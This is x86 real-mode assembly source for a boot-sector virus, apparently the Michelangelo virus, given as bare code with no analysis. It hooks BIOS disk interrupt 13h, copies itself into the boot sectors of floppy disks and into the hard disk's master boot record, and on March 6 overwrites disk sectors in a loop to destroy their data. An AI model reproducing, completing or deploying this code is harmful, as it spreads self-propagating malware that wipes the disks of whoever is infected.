    .intel_syntax noprefix
    .code16
    .text
    .org 0

Mich_Boot:
    jmp Second_Entry

Hi_JMP:       .word JMP_Here
Hi_JMP_Seg:   .word 0
Disk_Number:  .byte 2
Track_Sector: .word 3
INT13_Ofs:    .word 0
INT13_Seg:    .word 0

INT_13h:
    push ds
    push ax
    or dl,dl
    jne Real_INT13
    xor ax,ax
    mov ds,ax
    test byte ptr ds:0x43F,1
    jne Real_INT13
    pop ax
    pop ds
    pushf
    call far ptr cs:[INT13_Ofs]
    pushf
    call Infect
    popf
    retf 2
Real_INT13:
    pop ax
    pop ds
    jmp far ptr cs:[INT13_Ofs]

Infect:
    push ax
    push bx
    push cx
    push dx
    push ds
    push es
    push si
    push di
    push cs
    pop ds
    push cs
    pop es
    mov si,4
Read_Loop:
    mov ax,0x201
    mov bx,0x200
    mov cx,1
    xor dx,dx
    pushf
    call far ptr ds:[INT13_Ofs]
    jae Read_Done
    xor ax,ax
    pushf
    call far ptr ds:[INT13_Ofs]
    dec si
    jne Read_Loop
    jmp Quit
Read_Done:
    xor si,si
    cld
    lodsw
    cmp ax,word ptr [bx]
    jne Move_Real_Boot
    lodsw
    cmp ax,word ptr [bx+2]
    je Quit
Move_Real_Boot:
    mov ax,0x301
    mov dh,1
    mov cl,3
    cmp byte ptr [bx+0x15],0xFD
    je Write_Real_Boot
    mov cl,0x0E
Write_Real_Boot:
    mov word ptr Track_Sector,cx
    pushf
    call far ptr ds:[INT13_Ofs]
    jb Quit
    mov si,0x3BE
    mov di,0x1BE
    mov cx,0x21
    cld
    rep movsw
    mov ax,0x301
    xor bx,bx
    mov cx,1
    xor dx,dx
    pushf
    call far ptr ds:[INT13_Ofs]
Quit:
    pop di
    pop si
    pop es
    pop ds
    pop dx
    pop cx
    pop bx
    pop ax
    ret

Second_Entry:
    xor ax,ax
    mov ds,ax
    cli
    mov ss,ax
    mov ax,0x7C00
    mov sp,ax
    sti
    push ds
    push ax
    mov ax,word ptr ds:0x4C
    mov word ptr ds:[INT13_Ofs+0x7C00],ax
    mov ax,word ptr ds:0x4E
    mov word ptr ds:[INT13_Seg+0x7C00],ax
    mov ax,word ptr ds:0x413
    dec ax
    dec ax
    mov word ptr ds:0x413,ax
    mov cl,6
    shl ax,cl
    mov es,ax
    mov word ptr ds:[Hi_JMP_Seg+0x7C00],ax
    lea ax,[INT_13h]
    mov word ptr ds:0x4C,ax
    mov word ptr ds:0x4E,es
    mov cx,0x1BE
    mov si,0x7C00
    xor di,di
    cld
    rep movsb
    jmp far ptr cs:[Hi_JMP+0x7C00]

JMP_Here:
    xor ax,ax
    mov es,ax
    int 0x13
    push cs
    pop ds
    mov ax,0x201
    mov bx,0x7C00
    mov cx,word ptr Track_Sector
    cmp cx,7
    jne Read_Diskette
    mov dx,0x80
    int 0x13
    jmp short Check_Date
Read_Diskette:
    mov cx,word ptr Track_Sector
    mov dx,0x100
    int 0x13
    jb Check_Date
    push cs
    pop es
    mov ax,0x201
    mov bx,0x200
    mov cx,1
    mov dx,0x80
    int 0x13
    jb Check_Date
    xor si,si
    cld
    lodsw
    cmp ax,word ptr [bx]
    jne Infect_Partition
    lodsw
    cmp ax,word ptr [bx+2]
    jne Infect_Partition
Check_Date:
    xor cx,cx
    mov ah,4
    int 0x1A
    cmp dx,0x306
    je Detonate
    retf
Detonate:
    xor dx,dx
    mov cx,1
Sec_Locs:
    mov ax,0x309
    mov si,word ptr Track_Sector
    cmp si,3
    je Write_On_Them
    mov al,0x0E
    cmp si,0x0E
    je Write_On_Them
    mov dl,0x80
    mov byte ptr Disk_Number,4
    mov al,0x11
Write_On_Them:
    mov bx,0x5000
    mov es,bx
    int 0x13
    jae Cont_Writing
    xor ah,ah
    int 0x13
Cont_Writing:
    inc dh
    cmp dh,byte ptr Disk_Number
    jb Sec_Locs
    xor dh,dh
    inc ch
    jmp short Sec_Locs
Infect_Partition:
    mov cx,7
    mov word ptr Track_Sector,cx
    mov ax,0x301
    mov dx,0x80
    int 0x13
    jb Check_Date
    mov si,0x3BE
    mov di,0x1BE
    mov cx,0x21
    rep movsw
    mov ax,0x301
    xor bx,bx
    inc cl
    int 0x13
    jmp short Check_Date

    .org 0x1BE
Partitions:
    .org 0x1FE
    .word 0xAA55
